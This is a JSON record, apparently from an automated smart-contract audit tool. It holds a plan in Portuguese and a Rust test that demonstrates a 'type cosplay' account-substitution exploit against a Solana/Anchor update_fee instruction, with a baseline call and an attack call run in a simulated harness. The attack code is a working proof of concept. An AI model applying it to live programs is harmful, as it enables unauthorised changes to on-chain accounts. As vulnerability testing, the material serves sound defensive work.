attempts.raw:
{
  "plan": "Preparamos uma conta AdminConfig legítima com admin = authority e fee_basis_points = 100, e uma conta UserData com o mesmo layout (authority, balance) cujo authority é a mesma carteira. O baseline chama update_fee com a conta AdminConfig correta e deve ter sucesso. O ataque substitui a conta config pela conta UserData (mesmo layout, discriminador diferente) mantendo o mesmo signer authority. O efeito mede se a instrução aceitou a conta errada: se o ataque tiver sucesso, o campo fee_basis_points (offset 40) da conta UserData terá sido alterado para o novo valor, demonstrando type cosplay.",
  "scenario": "let authority = Pubkey::new_unique();
let admin_config_key = Pubkey::new_unique();
let user_data_key = Pubkey::new_unique();

let admin_config_data = anchor_account_data(
    "AdminConfig",
    &[authority.to_bytes().to_vec(), 100u64.to_le_bytes().to_vec()].concat(),
);
let user_data_data = anchor_account_data(
    "UserData",
    &[authority.to_bytes().to_vec(), 500u64.to_le_bytes().to_vec()].concat(),
);

let admin_config_account = account(&env.program_id, &admin_config_data, None);
let user_data_account = account(&env.program_id, &user_data_data, None);
let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(admin_config_key, false),
    AccountMeta::new_readonly(authority, true),
];
let baseline_ix = env.anchor_ix("update_fee", &(200u64,), metas.clone());
let baseline_accounts = vec![
    (admin_config_key, admin_config_account.clone()),
    (authority, authority_account.clone()),
];
let baseline_result = env.baseline("update_fee legitimo com AdminConfig", &baseline_ix, &baseline_accounts);
assert_eq!(baseline_result.program_result, ProgramResult::Success);

let attack_metas = vec![
    AccountMeta::new(user_data_key, false),
    AccountMeta::new_readonly(authority, true),
];
let attack_ix = env.anchor_ix("update_fee", &(999u64,), attack_metas);
let attack_accounts = vec![
    (user_data_key, user_data_account.clone()),
    (authority, authority_account.clone()),
];
let attack_result = env.attack("update_fee com UserData no lugar de AdminConfig", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let user_data_after = after(&attack_result, &user_data_key);
    let fee_after = read_u64(user_data_after.data(), 40);
    env.effect(
        "UserData foi aceita como AdminConfig e fee_basis_points foi alterado para 999",
        fee_after == 999,
    );
}"
}

